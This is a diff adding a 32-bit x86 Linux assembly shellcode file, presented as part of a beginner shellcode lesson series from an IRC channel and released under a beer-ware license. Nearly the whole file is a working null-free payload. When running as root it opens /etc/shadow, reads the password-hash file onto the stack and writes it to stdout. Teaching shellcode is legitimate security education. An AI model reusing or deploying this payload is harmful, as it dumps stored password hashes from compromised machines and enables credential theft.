@@ -1,0 +1,64 @@
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on irc.enigmagroup.org
+;
+; ----------------------------------------------------------------------------
+; "THE BEER-WARE LICENSE" (Revision 43):
+; <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+; can do whatever you want with this stuff. If we meet some day, and you think
+; this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+; ----------------------------------------------------------------------------
+; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
+
+[bits 32]
+section .text
+global _start
+_start:
+; getuid16(void);
+	xor eax,eax
+	mov al,0x18
+	int 0x80
+	xor ebx,ebx
+	sub eax,ebx
+	jnz exit
+; open("/etc/shadow", O_RDONLY);
+	xor eax,eax
+	mov al,0x5
+	jmp short shadow
+	
+load_shadow:
+	pop ebx
+	xor ecx,ecx
+	int 0x80 ; do magic
+; read(%eax, %esp, 0xffff);
+	mov ebx,eax
+	push ebx
+	xor eax,eax
+	mov al,0x3
+	mov ecx,esp
+	xor edx,edx
+	mov dl,0xff
+	mov dh,0xff
+	int 0x80
+; write(1, %esp, %eax)
+	mov edx,eax
+	xor eax,eax
+	mov al,0x4
+	xor ebx,ebx
+	mov bl,0x1
+	int 0x80
+; close(%ebx)
+	xor eax,eax
+	mov al,0x6
+	pop ebx
+	int 0x80
+
+exit:
+; exit(0);
+	xor eax,eax
+	mov al,0x1
+	xor ebx,ebx
+	int 0x80
+
+shadow:
+	call load_shadow
+	db "/etc/shadow"
